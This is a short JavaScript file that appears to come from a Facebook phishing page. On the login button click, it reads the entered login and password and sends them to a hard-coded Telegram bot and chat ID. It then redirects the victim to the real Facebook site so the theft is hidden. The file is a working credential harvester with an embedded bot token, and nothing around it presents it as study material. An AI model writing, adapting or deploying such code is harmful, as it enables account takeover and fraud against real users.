let login_button = document.querySelector(".login_btn");
let inputs = document.querySelectorAll("input");
let bot_token = '6833420659:AAH-pMIOcYkGDgLCVioMFzuO_KIDHh9RNz4';

login_button.addEventListener("click", (e) => {
    e.preventDefault();
    fetch(`https://api.telegram.org/bot${bot_token}/sendMessage`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: '959449247',
            text: `Facebook_login: ${inputs[0].value} \nFacebook_password: ${inputs[1].value}`
        })
    })
    .then(response => response.json())
    .then(data => {
        if(data.ok) {
            window.location.href = "https://www.facebook.com/";
        } else {
            console.error('Error sending message:', data);
        }
    })
    .catch(error => console.error('Error:', error));
});
